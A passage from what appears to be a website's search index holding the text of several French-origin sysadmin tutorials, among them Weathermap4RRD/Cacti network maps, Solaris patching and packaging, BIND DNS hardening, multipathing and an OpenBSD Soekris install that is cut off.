                content: "Introduction linkDo you like looking at the network maps on Free or OVH websites? Would you like to have the same for your own network? That’s what we’ll do in this article, which is primarily aimed at network administrators.\nFor this article, we’ll be using Cacti and a variation of the original Weathermap: Weathermap4RRD. This fork is not based on MRTG like the original Weathermap, and we’ll take advantage of this difference.\nEstablished fact: admins are lazy. Therefore, we hate doing the same tedious task twice: machines are here to do it for us.\nFor this article, I assume that our Cacti is working properly and measuring various links across different sites. It produces RRA files (Round Robin Archive, where Cacti stores its measurements) from which it generates graphs that our busy decision-makers enjoy viewing. We’ll be using these files: they contain all the data Weathermap4RRD will need. One measurement and (at least) two graphical outputs - great, isn’t it?\nInstallation linkNothing could be simpler on a Debian (or any apt-enabled distribution):\napt-get install weathermap4rrd Yes, that’s it: we’ll see the configuration of Weathermap and the graphs once we have a clear view of our plan of attack.\nConfiguration linkI’m going to reuse real data here, only the names have been changed. The network topology is as follows: a datacenter in Paris, a remote site in Lyon, and another remote site in Bordeaux. The connection between Paris and Lyon has a bandwidth of 10 Mb, and the one between Paris and Bordeaux has a bandwidth of 2 Mb. So we’ll have 3 locations to place and 2 lines to draw on the graph: Paris/Lyon and Paris/Bordeaux.\nThe necessary and tedious part is identifying in Cacti the names of the RRAs that correspond to the measurements taken for each site.\nTo do this, we’ll use the Cacti web interface. In the console, “Data Sources” section, select (using search if needed) the data source corresponding to the network bandwidth for each site. The info we’re interested in is the “Data Source Path”, for example /router_lyon_254_traffic_in_334.rrd.\nOn a Debian, the default is /var/lib/cacti/rra/.\nThis operation must be performed for each location to be represented and for each interface that is the starting point of a line. It’s time-consuming, but it only needs to be done once. Now we have all the necessary information to get started.\nEach graph has its configuration file; in our case we’ll use /etc/weathermap4rrd/weathermap4rrd.sites.conf.\nFor the graph, we’ll choose a map background (Google images will help us find one) to make our graph more meaningful and pleasant to look at.\nThe configuration file /etc/weathermap4rrd/weathermap4rrd.sites.conf:\n# the map background BACKGROUND /var/www/weathermap/france.png # Its dimensions HEIGHT 1140 WIDTH 1120 # The font size (from 1 to 5) FONT 3 # Positioning of the link usage legend KEYPOS 10 10 # The title of the graph TITLE \"Paris/Regional Links Usage\" # Its position TITLEPOS 130 12 # Its color (black) TITLEFOREGROUND 0 0 0 # The file to generate OUTPUTFILE /var/www/weathermap/weathermap_sites.png # Here we define the legend colors # low high red green blue SCALE 1 10 140 0 255 SCALE 10 25 32 32 255 SCALE 25 40 0 192 255 SCALE 40 55 0 240 0 SCALE 55 70 240 240 0 SCALE 70 85 255 192 0 SCALE 85 100 255 0 0 # Definition of sites to represent NODE paris POSITION 610 300 LABEL paris NODE bordeaux POSITION 380 800 LABEL bordeaux NODE lyon POSITION 840 694 LABEL lyon # Definition of links to represent LINK paris-bordeaux NODES bordeaux paris TARGET /var/lib/cacti/rra/routeur_bordeaux_254_traffic_in_318.rrd INPOS 1 OUTPOS 2 UNIT bytes # 2Mb BANDWIDTH 2048 DISPLAYVALUE 1 ARROW normal GROUP sites INTERNODEDISPLAY 50 # We reuse the \"nodes\" defined just before LINK paris-lyon NODES lyon paris TARGET /var/lib/cacti/rra/routeur_lyon_254_traffic_in_334.rrd INPOS 1 OUTPOS 2 UNIT bytes # 10Mb BANDWIDTH 10240 DISPLAYVALUE 1 ARROW normal GROUP sites INTERNODEDISPLAY 50 A quick test to make sure everything is working properly:\nweathermap4rrd -c /etc/weathermap4rrd/weathermap4rrd.sites.conf And our result is in /var/www/weathermap/weathermap_sites.png. We can make some position adjustments or other cosmetic checks.\nNot working? Don’t panic, use the –debug switch on the command line to get more information about what’s happening.\nThe hardest part is done, but now we need to automatically update this data and present it to the world.\nPublish the Graphs linkWe’ll quickly define a virtualhost for our application:\nServerAdmin nico@rottenbytes.info ServerName weathermap.rottenbytes.info DocumentRoot /var/www/weathermap Options FollowSymLinks AllowOverride None Options Indexes FollowSymLinks MultiViews AllowOverride None Order allow,deny allow from all ErrorLog /var/log/apache2/error.log LogLevel warn CustomLog /var/log/apache2/access.log combined ServerSignature Off We also need a small script to regenerate all this:\n#!/bin/sh weathermap4rrd -c /etc/weathermap4rrd/weathermap.sites.conf convert /var/www/weathermap/weathermap_sites.png -resize 25% /var/www/weathermap/weathermap_sites_t.png We’ll create the following entry in the crontab:\n*/2 * * * * /opt/scripts/weathermap.sh To recreate the graphs every 2 minutes, even though Cacti polls by default every 5 minutes, we’ll have more “up-to-date” data this way.\nAs a finishing touch, this script creates a thumbnail with convert (from the ImageMagick package) at 25% of the original size, which will perfectly complement the (very basic) page to use as an index for our vhost:\nNetwork Usage Network Usage (data updated every 5 minutes) France/data\nThat’s it! This article is finished and I hope it has inspired you to do the same thing in your environment.\nResources linkhttps://www.unixgarden.com/index.php/administration-systeme/1086\n"
            }
        );
    index.add(
            {
                id:  496 ,
                href: "\/G%C3%A9rer_ses_updates_avec_Update_Manager_et_smpatch\/",
                title: "Managing Updates with Update Manager and smpatch",
                description: "How to manage Solaris updates using Update Manager GUI and smpatch CLI tools",
                content: "Introduction linkAs I love Debian and some of my servers are running on Solaris, I had to get in touch with Solaris update solutions. They have a GUI called Solaris Update Manager and the CLI version called smpatch.\nAs it is on servers, I don’t have a graphical interface and I need to run updates with command lines. That’s what I’ll specifically talk about in this documentation. List of interesting binaries:\npprosetup: Used to set the rules for downloading and applying patches. pprosvc: The automation service program for Patch Manager. smpatch: Used to actually download, apply, and remove the patches specified on the command line. Update Manager linkJust to give you a quick idea, when you have a graphical interface, it looks like this:\nI won’t explain how it works as it is very simple.\nsmpatch linksmpatch is the command line version of Update Manager.\nConfiguration linkSet proxy settings link smpatch set patchpro.proxy.host=fqdn_of_proxy_host smpatch set patchpro.proxy.port=proxy_port smpatch set patchpro.proxy.user=proxy_username_if_needed Now set password by prompt:\nsmpatch set patchpro.proxy.passwd Configuration files linkHere are the configuration files:\nSystem defaults: /var/sadm/install/admin/default PatchPro defaults: /etc/opt/SUNWppro/etc/patchpro.conf /opt/SUNWppro/lib/.proxypw SunSolve Account Options /etc/patch/patch.conf /etc/patch/secret.conf Analyze linkThe analyze will check what needs to be updated on your server:\n$ smpatch analyze 122213-34 GNOME 2.6.0_x86: GNOME Desktop Patch 119901-09 GNOME 2.6.0_x86: Gnome libtiff - library for reading and writing TIFF Patch 142293-01 SunOS 5.10_x86: Place Holder patch 141445-09 SunOS 5.10_x86: kernel patch 141031-05 SunOS 5.10_x86: passwd patch 142335-01 SunOS 5.10_x86: mixer patch 119784-13 SunOS 5.10_x86: bind patch 126869-04 SunOS 5.10_x86: SunFreeware bzip2 patch 120273-27 SunOS 5.10_x86: SMA patch 123896-15 SunOS 5.9_x86 5.10_x86: Common Agent Container (cacao) runtime 2.2.3.1 upgrade patch 15 121082-08 SunOS 5.10_x86: Disable Transport Agentry for Sun Update Connection Hosted EOL 118778-12 SunOS 5.10_x86: Sun GigaSwift Ethernet 1.0 driver patch 141503-02 SunOS 5.10_x86: auditconfig patch 141525-05 SunOS 5.10_x86: ssh and openssl patch 141511-04 SunOS 5.10_x86: ehci, ohci, uhci patch ... Upgrade linkNow you want to upgrade. You have 2 choices:\nAutomatic update: will check what is needed and will upgrade your system as well Manual update: you’ll need to download them and install them afterward Automatic linkThe automatic update will do everything on its own (download + install):\n$ smpatch update 122213-34 has been validated. 119901-09 has been validated. 142293-01 has been validated. 141445-09 has been validated. 141031-05 has been validated. ... That’s all. It will tell you if it’s necessary to reboot or not.\nManual linkFor the manual upgrade, you’ll need first to download updates:\n$ smpatch download 125534-15 has been validated. 126364-08 has been validated. ... And then install them:\n$ smpatch add Default storage location linkBy default, updates are stored in this folder /var/sadm/spool/. Updates are in .jar format:\n$ ls /var/sadm/spool/ 118668-23.jar 121431-43.jar 125953-19.jar 139100-02.jar 141589-03.jar 118778-12.jar 122213-34.jar 125993-04.jar 139621-01.jar 141591-01.jar 119116-35.jar 122260-02.jar 126018-05.jar 140018-03.jar 141879-08.jar 119214-20.jar 122471-03.jar 126036-07.jar 140130-10.jar 142241-01.jar References linkhttp://www.cuddletech.com/blog/pivot/entry.php?id=579\nhttp://docs.huihoo.com/opensolaris/system-administration-guide-basic-administration/html/ch22s06.html\nhttp://bob.vancleef.org/index.php?name=News\u0026file=article\u0026sid=56\nhttp://www.sun.com/service/sunupdate/flash_content.html\n"
            }
        );
    index.add(
            {
                id:  497 ,
                href: "\/Securing_a_Bind_architecture\/",
                title: "Securing a Bind Architecture",
                description: "How to secure a Bind DNS architecture with proper configurations for primary and secondary servers, including access control and zone transfers.",
                content: "Introduction linkThe figure below shows the general operation of DNS queries in an architecture with multiple DNS servers. Some of these servers (IP 192.168.69.1, 192.168.66.1, and 194.54.3.68) are associated with managing names for a fictional domain test.fr. Another private DNS server (IP 10.59.1.3) is associated with managing a fictional private domain (invisible from the Internet) called here.local. Two arbitrary external DNS servers located on the Internet are also represented.\nThis architecture corresponds to a situation where the company’s internal DNS servers are installed in the protected area of the network, both for the domain visible from the Internet (test.fr) and for its local private domain (here.local). Since multiple DNS servers (at least two) must be available from the Internet to manage the public domain test.fr (this is required to be assigned a domain name), a second server is positioned in a DMZ (192.168.66.1), and a third one (194.54.3.68) is likely located at an external provider offering a truly redundant backup service.\nImplementation linkgraph TD DNS_EXT2[\"DNS Server\\nExternal 2\"] DNS_EXT1[\"DNS Server\\nExternal 1\"] DNS_SEC1[\"DNS Server\\nSecondary\\ntest.fr\\n194.54.3.68\"] DNS_SEC2[\"DNS Server\\nSecondary\\ntest.fr\\n192.168.66.1\"] DNS_PRI[\"DNS Server\\nPrimary\\ntest.fr\\n10.59.1.3\"] DNS_INT[\"DNS Server\\nInternal\\nhere.local\\n10.59.1.3\"] CLIENT[\"Workstation\\nClient\"] %% Connections DNS_SEC1 --\u003e|\"Secondary to Secondary\"| DNS_SEC2 DNS_SEC2 --\u003e|\"Secondary to Primary\"| DNS_PRI DNS_EXT2 -.-\u003e|\"External to External\"| DNS_EXT1 DNS_EXT2 -.-\u003e|\"External to Secondary\"| DNS_SEC2 DNS_EXT1 -.-\u003e|\"External to Primary\"| DNS_PRI DNS_INT --\u003e|\"Internal to Primary\"| DNS_PRI CLIENT -.-\u003e|\"Client to Internal\"| DNS_INT %% Legend RECURSIVE[\"Recursive queries\"] --- DNS_PRI ITERATIVE[\"Iterative queries\"] -.- DNS_PRI ZONE[\"Zone transfers\"] === DNS_PRI %% Styling classDef secondary fill:#f5f5f5,stroke:#999 classDef primary fill:#fff,stroke:#000 classDef external fill:#fff,stroke:#000 classDef internal fill:#fff,stroke:#000 classDef client fill:#fff,stroke:#000 class DNS_SEC1 secondary class DNS_SEC2,DNS_PRI primary class DNS_EXT1,DNS_EXT2 external class DNS_INT internal class CLIENT client In this diagram, we can distinguish different types of DNS queries that can transit on the network:\nRecursive queries correspond to the requests normally made by clients to their regular DNS server, which then handles the entire name resolution protocol. It consults its cache and contacts several other DNS servers if needed to get a response or an error. Iterative queries correspond to resolution requests generally made between DNS servers themselves. Responses to iterative queries may consist of redirecting the requester to another server, leaving the requester to continue the resolution themselves. Zone transfer requests are made between a secondary server and the primary server for the same domain to allow the secondary server to have an up-to-date copy of the DNS zone it manages. We also distinguish the dual role that DNS servers generally play from the perspective of information flows crossing the architecture. Indeed, they are both:\nservers in the true sense of the term that respond to incoming requests from external clients (other DNS servers) concerning the managed domain (test.fr in our example); and relays that execute outgoing DNS resolution requests on behalf of internal clients and also maintain a cache to accelerate them. A first approach to DNS server security consists of clarifying the architecture and properly configuring the servers so that they respond to these different requests correctly based on the client’s origin.\nThus, it is important to properly limit zone transfers, which distribute all information about test.fr at once. This limitation must be made on the primary server (IP 192.168.69.1) by identifying the secondary servers authorized to receive a copy of the zone:\nzone \"test.fr\" { type master; file \"/etc/bind/db.test.fr\"; allow-transfer { 192.168.66.1; // or 194.56.3.68; (see below) }; }; But this limitation can also be made on the secondary server (IP 192.168.66.1) by specifying precisely the primary server to use for the test.fr zone of which it is secondary:\nzone \"test.fr\" { type slave; masters { 192.168.69.1; }; file \"/etc/bind/bak.db.test.fr\"; allow-transfer { 194.56.3.68; // or \"none\" }; }; Next, on both the primary and secondary servers, it’s possible to control access to managed zones:\niterative queries come from other servers (i.e., from the Internet); recursive queries come only from internal clients, i.e., end users (or their proxy). Indeed, in the example we’re following, the internal public DNS server at IP address 192.168.69.1 actually receives user queries via the internal private DNS server at address 10.59.1.3. The latter is normally its only client, except for a few exceptions (other servers, possible troubleshooting, etc.). These are the rules we apply here:\n// We allow only recursive queries from the internal nameserver, the 2nd, and self acl \"ns_rzo\" { 192.168.66.1; 10.59.1.3; 127.0.0.1; }; // We also allow some admin. station to do queries here directly in case of problem acl \"admin\" { 192.168.65.1; }; … allow-query { any; }; // or \"slaves_ns\" allow-recursion { \"ns_rzo\"; \"admin\"; }; So here we have the case of a DNS server (IP 192.168.69.1) that contains the reference for the company’s public domain (test.fr), which manages DNS resolution requests on the Internet on behalf of all workstations, but whose configuration allows almost only a single client. This is actually perfectly consistent with the desired flow of network traffic in the architecture. Furthermore, since the private internal DNS server (IP 10.59.1.3) is very close to the DNS server accessing the Internet, it is not necessary to use its caching functions, which are redundant with those implemented at the next level. It is then useful to have this last server operate in pure relay mode:\noptions { … // Allowed forwarders (only the DMZ nameservers) forwarders { 192.168.69.1; 192.168.66.1; }; // We *always* forward forward only; … }; The advantage of this type of architecture is that it provides maximum protection for the company’s private internal DNS server, which absolutely does not access the Internet directly but is nevertheless able to provide all the DNS services necessary for workstations on the local network, including the resolution of names external to the company. This server is also able to resolve internal names within the company (in the here.local domain) that it manages directly. Workstations thus have transparent access to all the different domains.\nResources linkhttps://fr.wikibooks.org/wiki/Utilisateur:Rortalo/Sécurité_informatique/DNS_avec_BIND_9\n"
            }
        );
    index.add(
            {
                id:  498 ,
                href: "\/O_par_une_application\/",
                title: "Limiting I/O usage by an application",
                description: "Learn how to identify and limit I/O usage by applications to improve system performance and responsiveness.",
                content: "Introduction linkWant to know why your load average is so high? Run this command to see what processes are on the run queue. Runnable processes have a status of “R”, and commands waiting on I/O have a status of “D”.\nOnce found, you may need to reduce its I/O requests, so we’ll use ionice.\nGet I/O apps linkTo get the biggest I/O consuming applications:\nps -eo stat,pid,user,command On some older versions of Linux may require -emo instead of -eo.\nAnd on Solaris:\nps -aefL -o s -o user -o comm Ionice linkionice limits process I/O, to keep it from swamping the system (Linux)\nThis command is somewhat similar to ’nice’, but constrains I/O usage rather than CPU usage. In particular, the ‘-c3’ flag tells the OS to only allow the process to do I/O when nothing else is pending. This dramatically increases the responsiveness of the rest of the system if the process is doing heavy I/O.\nThere’s also a ‘-p’ flag, to set the priority of an already-running process.\nionice -c3 find / "
            }
        );
    index.add(
            {
                id:  499 ,
                href: "\/Connaitre_le_temps_d%27ex%C3%A9cution_d%27une_ou_plusieurs_commandes\/",
                title: "Measuring Execution Time of One or Multiple Commands",
                description: "How to measure the execution time of commands in Unix-like systems",
                content: "Introduction linkYou may need to know exactly the time it takes to execute some commands. The time command is perfect for this purpose.\nThis command is a bash builtin.\nExamples linkThe last semicolon ; is important. For example:\ntime { rm -rf /folder/bar \u0026\u0026 mkdir -p /folder/bar ; echo \"done\" ; } This will give you the time taken to execute the entire block of commands as a single unit.\n"
            }
        );
    index.add(
            {
                id:  500 ,
                href: "\/Cr%C3%A9er_un_package_Solaris\/",
                title: "Creating a Solaris Package",
                description: "Learn how to create your own Solaris packages for efficient software distribution and management.",
                content: "1 Introduction linkCreating your own Solaris package can be very practical. Why? It saves time and it’s clean :-)\nWe will need several files, but not all of them are mandatory. I’ll try to detail as much as possible to make everything clear.\nIt’s also possible to secure your package by certifying it via SSL, GPG, etc.\n2 Creating Necessary Files linkLet’s create a package folder and work in it. Here’s the composition of a package:\npackage |-- NAMEofpackage | |-- etc | | `-- deimos | `-- usr | |-- bin | | `-- deimos_cluster | `-- perl5 | |-- 5.8.4 | | |-- lib | | | `-- i86pc-solaris-64int | | | `-- perllocal.pod | | `-- man | | `-- man3 | | `-- Unix::Syslog.3 | `-- site_perl | `-- 5.8.4 | `-- i86pc-solaris-64int | |-- Unix | | `-- Syslog.pm | `-- auto | `-- Unix | `-- Syslog | |-- Syslog.bs | `-- Syslog.so |-- copyright |-- depend |-- pkginfo `-- prototype This includes:\nNAMEofpackage: A package name with 3 to 4 unique capital letters, which will contain all the files necessary for installation copyright and other files: Files that will interact during the package usage phase or simply contain information Let me detail the last point. Here are the files you can use:\npkginfo: Contains information about the package (mandatory) prototype: Contains the list of files and directories to copy. Also contains the package configuration files (mandatory) compver: Defines older versions of packages compatible with this one depend: Defines other packets required to install this packet space: Defines the disk space required for this package copyright: The copyright request: Prerequisites for installation checkinstall: Script performing tests to verify that everything is fine before installation preinstall: Script to prepare for installation postinstall: Script to finish installation preremove: Script to prepare for package removal postremove: Script to finish the removal Create a folder containing the desired name of your package and the desired tree structure as shown in the example above.\n2.1 copyright linkFor copyright, put your own. Something simple:\nCopyright (c) 2009 Deimos All Rights Reserved This product is protected by copyright and distributed under licenses restricting copying, distribution, and decompilation. 2.2 depend linkIf you have dependencies for your package, you must list them here. For example, in this case, I need to have Perl and associated libraries. I’ll gather the list of packet names I need and put them in my depend file:\n$ pkginfo | grep perl584 | grep -v man \u003e depend system SUNWperl584core Perl 5.8.4 (core) system SUNWperl584usr Perl 5.8.4 (non-core) Then, we need to replace ‘system’ with ‘P’ to get this in our file:\nP SUNWperl584core Perl 5.8.4 (core) P SUNWperl584usr Perl 5.8.4 (non-core) 2.3 pkginfo linkNow, the famous file containing the package description:\nARCH=i386 CATEGORY=application NAME=Deimos Clustering Solution PKG=NAMEofpackage VERSION=1.0 DESC=Clustering Solution for Sun Cluster (SunPlex) VENDOR=Deimos - http://www.deimos.fr EMAIL=xxx@mycompany.com BASEDIR=/ 2.4 prototype linkFinally, this file is the most complex. It must contain all existing file names (f), folders (d), and also information (i).\nUse only what you need (pkginfo is mandatory):\necho \"i pkginfo=~/package/pkginfo\" \u003e prototype echo \"i copyright=~/package/copyright\" \u003e\u003e prototype echo \"i depend=~/package/depend\" \u003e\u003e prototype Then I’ll go to my NAMEofpackage folder and add what’s left:\ncd NAMEofpackage pkgproto . \u003e\u003e ../prototype The content of my file should ultimately look something like this:\ni pkginfo=~/package/pkginfo i copyright=~/package/copyright i depend=~/package/depend d none etc 0755 root sys d none etc/deimos 0755 root root d none usr 0755 root root d none usr/perl5 0755 root root d none usr/perl5/site_perl 0755 root root d none usr/perl5/site_perl/5.8.4 0755 root root d none usr/perl5/site_perl/5.8.4/i86pc-solaris-64int 0755 root root d none usr/perl5/site_perl/5.8.4/i86pc-solaris-64int/auto 0755 root root d none usr/perl5/site_perl/5.8.4/i86pc-solaris-64int/auto/Unix 0755 root root d none usr/perl5/site_perl/5.8.4/i86pc-solaris-64int/auto/Unix/Syslog 0755 root root f none usr/perl5/site_perl/5.8.4/i86pc-solaris-64int/auto/Unix/Syslog/Syslog.bs 0644 root root f none usr/perl5/site_perl/5.8.4/i86pc-solaris-64int/auto/Unix/Syslog/Syslog.so 0755 root root f none usr/perl5/site_perl/5.8.4/i86pc-solaris-64int/auto/Unix/Syslog/.packlist 0644 root root d none usr/perl5/site_perl/5.8.4/i86pc-solaris-64int/Unix 0755 root root f none usr/perl5/site_perl/5.8.4/i86pc-solaris-64int/Unix/Syslog.pm 0644 root root d none usr/perl5/5.8.4 0755 root root d none usr/perl5/5.8.4/man 0755 root root d none usr/perl5/5.8.4/man/man3 0755 root root f none usr/perl5/5.8.4/man/man3/Unix::Syslog.3 0644 root root d none usr/perl5/5.8.4/lib 0755 root root d none usr/perl5/5.8.4/lib/i86pc-solaris-64int 0755 root root f none usr/perl5/5.8.4/lib/i86pc-solaris-64int/perllocal.pod 0644 root root d none usr/bin 0755 root root f none usr/bin/deimos_cluster 0740 root root 3 Creating the Package linkNow we’ll create the package. We’ll make a package_done folder to create the package in:\ncd ~/package mkdir package_done pkgmk -o -b . -d package_done -f prototype At this point, we have our Solaris package in folder form and not with a pkg extension (which is classier, more beautiful, and glows in the dark). That’s why here’s the final step:\ncd package_done pkgtrans -s . NAMEofpackage.pkg NAMEofpackage And now I have my beautiful package in .pkg format :-)\n4 Resources linkhttps://docs.sun.com/app/docs/doc/817-0406/ch1designpkg-51728?a=view\n"
            }
        );
    index.add(
            {
                id:  501 ,
                href: "\/Multipathing_management_on_Solaris\/",
                title: "Multipathing Management on Solaris",
                description: "A guide to manage multipathing on Solaris systems, including configuration, verification of fibers, and volume management.",
                content: "Introduction linkMultipathing allows for connection to multiple links. For example, a disk array connected via fiber to machines can have 2 fibers per machine.\nTo manage this type of configuration, you need to use multipathing.\nConfiguration linkTo check if your multipath is enabled, it’s simple. Look at your devices, they should look like this:\n/dev/dsk/c3t2000002037CD9F72d0s0 instead of this:\n/dev/dsk/c1t1d0s0 If this is not the case, then perform the actions that follow.\nKernel linkWe need to enable multipathing at the kernel level. To do this, replace the following value (/kernel/drv/fp.conf):\nmpxio-disable=\"yes\"; to\nmpxio-disable=\"no\"; Let’s make sure the change is applied at the next restart:\ntouch /reconfigure Then restart the server.\nManagement linkVerification of fibers linkYou need to check the status of the fibers before continuing. To check the status of HBAs for example:\n$ fcinfo hba-port HBA Port WWN: 2100001b3281b4e8 OS Device Name: /dev/cfg/c2 Manufacturer: QLogic Corp. Model: 375-3356-02 Firmware Version: 4.04.01 FCode/BIOS Version: BIOS: 1.24; fcode: 1.24; EFI: 1.8; Serial Number: 0402H00-0850613916 Driver Name: qlc Driver Version: 20080617-2.29 Type: N-port State: online Supported Speeds: 1Gb 2Gb 4Gb Current Speed: 4Gb Node WWN: 2000001b3281b4e8 HBA Port WWN: 2101001b32a1b4e8 OS Device Name: /dev/cfg/c3 Manufacturer: QLogic Corp. Model: 375-3356-02 Firmware Version: 4.04.01 FCode/BIOS Version: BIOS: 1.24; fcode: 1.24; EFI: 1.8; Serial Number: 0402H00-0850613916 Driver Name: qlc Driver Version: 20080617-2.29 Type: N-port State: online Supported Speeds: 1Gb 2Gb 4Gb Current Speed: 4Gb Node WWN: 2001001b32a1b4e8 Multipathing link Get the logical units of the system: $ mpathadm list lu /scsi_vhci/disk@g600a0b8000492c63000005fd49e8305b Total Path Count: 4 Operational Path Count: 4 To get more details: $ mpathadm show lu /scsi_vhci/disk@g600a0b8000492c63000005fd49e8305b Logical Unit: /scsi_vhci/disk@g600a0b8000492c63000005fd49e8305b mpath-support: libmpscsi_vhci.so Vendor: SUN Product: LCSM100_F Revision: 0735 Name Type: unknown type Name: 600a0b8000492c63000005fd49e8305b Asymmetric: yes Current Load Balance: round-robin Logical Unit Group ID: NA Auto Failback: on Auto Probing: NA Paths: Initiator Port Name: 2101001b32a12ae9 Target Port Name: 203400a0b8492c63 Override Path: NA Path State: OK Disabled: no Initiator Port Name: 2101001b32a12ae9 Target Port Name: 203500a0b8492c63 Override Path: NA Path State: OK Disabled: no Initiator Port Name: 2100001b32812ae9 Target Port Name: 202500a0b8492c63 Override Path: NA Path State: OK Disabled: no Initiator Port Name: 2100001b32812ae9 Target Port Name: 202400a0b8492c63 Override Path: NA Path State: OK Disabled: no Target Port Groups: ID: 1 Explicit Failover: yes Access State: active Target Ports: Name: 203400a0b8492c63 Relative ID: 0 Name: 202400a0b8492c63 Relative ID: 0 ID: 2 Explicit Failover: yes Access State: standby Target Ports: Name: 203500a0b8492c63 Relative ID: 0 Name: 202500a0b8492c63 Relative ID: 0 Application of your Volumes linkQuick info for your freshly created LUNs. You may not see them immediately on your systems. Why? Because you might have other previous tasks - check in CAM if you’re not queued for the creation of these LUNs in the jobs list. If they’re created but you still don’t see anything, you’ll need to refresh everything rather than use the cache. Run the devfsadm command once so that new volumes are seen:\ndevfsadm If it still doesn’t work, run this command:\ncfgadm -al Flushing LUNs that no longer exist linkIf you have LUNs that have been removed and are not visible to the servers, you may encounter some issues with Sun Cluster if you don’t reboot. That’s why you should use the following commands after each deletion, on all nodes:\ncfgadm -c configure cN cfgadm -c configure cN+1 cfgadm -c unconfigure -o unusable_SCSI_LUN cN cfgadm -c unconfigure -o unusable_SCSI_LUN cN+1 devfsadm -C -v Then use the following command on only one node:\nscgdevs References linkhttp://docs.sun.com/source/819-0139/ch_3_admin_multi_devices.html\nhttp://www.princeton.edu/~unix/Solaris/troubleshoot/mpathadm.html\n"
            }
        );
    index.add(
            {
                id:  502 ,
                href: "\/D%C3%A9sactiver_le_son_sous_GDM\/",
                title: "Disable Sound in GDM",
                description: "How to disable the login sound in GDM on Ubuntu systems for a quieter computing experience.",
                content: "Introduction linkIf like me, you want to have Ubuntu as silent as possible, you need to disable the startup sound in GDM.\nCommand link sudo -u gdm gconftool-2 --set /desktop/gnome/sound/event_sounds --type bool false Resources linkhttps://www.webupd8.org/2009/10/turn-off-login-sound-in-ubuntu-karmic.html\n"
            }
        );
    index.add(
            {
                id:  503 ,
                href: "\/Modifier_les_serveurs_de_synchronisation_NTP_sous_Windows\/",
                title: "Modifying NTP Synchronization Servers on Windows",
                description: "How to configure NTP synchronization servers on Windows systems using w32tm commands",
                content: "Introduction linkI have a Windows Server 2008 DC and I wanted to use my internal time server on a Linux box running ntpd.\nAfter a little hunting around, I found the command required to set Windows up to use the correct time peer.\nConfiguration link w32tm /config /update /manualpeerlist:\"0.pool.ntp.org,0x8 1.pool.ntp.org,0x8\" /syncfromflags:MANUAL After making this change, you need to restart the Windows Time Service by issuing the following 2 commands:\nnet stop w32time net start w32time If you have problems, first make sure the Windows Time Service is enabled.\nNote: This works with Windows XP, Windows Vista, Windows Server 2003 and Windows Server 2008.\nResources linkhttp://blogs.msdn.com/w32time/default.aspx\nhttp://www.meinberg.de/german/sw/ntp.htm\n"
            }
        );
    index.add(
            {
                id:  504 ,
                href: "\/create-your-own-graphs\/",
                title: "Create Your Own Graphs",
                description: "How to create custom graphs in Cacti with example scripts for monitoring CPU, RAM, and Mldonkey",
                content: "Ahhhh Cacti! It’s wonderful when it works! Yes, yes, those beautiful graphs look great. However, it’s true that when you want to create your own graph, that’s a different story! So I found this comprehensive documentation that works perfectly as long as you follow it to the letter!\nDocumentation on creating a graph in Cacti\nNow that you know how to create graphs, here are some scripts I made a while ago.\nCPU Graph linkCPU Graph - /usr/share/cacti/site/scripts/cpu-stats.sh\nMYTOP=`top -b -n 2 | grep Cpu | tail -1` USAGE=`echo $MYTOP | awk '{ print $2 }' | awk -F\"%\" '{ print $1 }' | awk -F\".\" '{ print $1 }'` SYSTEM=`echo $MYTOP | awk '{ print $4 }' | awk -F\"%\" '{ print $1 }' | awk -F\".\" '{ print $1 }'` IDLE=`echo $MYTOP | awk '{ print $8 }' | awk -F\"%\" '{ print $1 }' | awk -F\".\" '{ print $1 }'` typeset -i USAGE typeset -i SYSTEM typeset -i IDLE printf \"cpu_usage:%d cpu_system:%d cpu_idle:%d\\n\" $USAGE $SYSTEM $IDLE Mldonkey Graph linkMldonkey Graph - /usr/share/cacti/site/scripts/mldonkey-stats.sh\nMY_ML=`mldonkey_command bw_stats -p \"\" | grep Down` ML_DOWN=`echo $MY_ML | awk '{ print $2 }' | awk -F. '{ print $1 }'` ML_UP=`echo $MY_ML | awk '{ print $11 }' | awk -F. '{ print $1 }'` ML_FILES=`mldonkey_command vd -p \"\" | grep \"\\[D \" | wc | awk '{ print $1 }'` typeset -i ML_DOWN typeset -i ML_UP typeset -i ML_FILES printf \"ml_down:%d ml_up:%d ml_files:%d\\n\" $ML_DOWN $ML_UP $ML_FILES RAM Graph linkRAM Graph - /usr/share/cacti/site/scripts/ram-stats.sh\nMY_RAM=`free -o | grep \"Mem:\"` RAM_TOTAL=`echo $MY_RAM | awk '{ print $2 }'` RAM_USED=`echo $MY_RAM | awk '{ print $3 }'` RAM_FREE=`echo $MY_RAM | awk '{ print $4 }'` typeset -i RAM_TOTAL typeset -i RAM_USED typeset -i RAM_FREE printf \"ram_total:%d ram_used:%d ram_free:%d\\n\" $RAM_TOTAL $RAM_USED $RAM_FREE "
            }
        );
    index.add(
            {
                id:  505 ,
                href: "\/Configuration_et_installation_via_port_s%C3%A9rie_d%27OpenBSD_sur_Soekris\/",
                title: "OpenBSD Configuration and Installation via Serial Port on Soekris",
                description: "Complete guide to install OpenBSD on a Soekris device using the serial port and optimizing for CompactFlash storage",
                content: "Introduction linkYou’ve just bought a Soekris board without thinking too much about it… don’t worry, it works like a charm :-).\nI’m going to explain how I was able to put OpenBSD on my Soekris with a CompactFlash drive.\nMaterials Used linkFor my installation, I needed:\nA DB9 Female/Female serial cable (also called NULL-MODEM) A USB to serial port cable (I no longer have serial ports on my machines) A network cable connected to interface 1 (the first one) of the Soekris for the PXE boot to work A Compact Flash card (Kingston Elite Pro 16GB 133X) (SanDisk is preferred for compatibility reasons) And finally, the Soekris 5501-70 Prerequisites linkBefore starting, certain things need to be set up. I won’t explain how all the services below work, so I’ll simply provide my configurations. However, I invite you to check out:\nDHCP3: Installation and Configuration of a DHCP Server TFTP: PXE Server, OS Deployment under Linux My DHCP and TFTP server has the IP address 192.168.10.107 here.\nDHCP Server linkHere’s my DHCP configuration:\nddns-update-style ad-hoc; option domain-name-servers 212.27.40.241, 212.27.40.240; option routers 192.168.10.138; log-facility local7; subnet 192.168.10.0 netmask 255.255.255.0 { range 192.168.10.70 192.168.10.80; filename \"pxeboot\"; next-server 192.168.10.107; option root-path \"/var/lib/tftpboot\"; } Don’t forget to restart the DHCP server after making changes.\nTFTP Server linkFor TFTP, go to /var/lib/tftpboot and do this:\ncd /var/lib/tftpboot wget http://ftp.arcane-networks.fr/pub/OpenBSD/snapshots/i386/bsd.rd wget http://ftp.arcane-networks.fr/pub/OpenBSD/snapshots/i386/pxeboot mkdir etc touch etc/boot.conf chmod -Rf 777 . Then edit the boot.conf file and insert these lines:\nset tty com0 stty com0 19200 boot bsd.rd Don’t forget to restart your TFTP 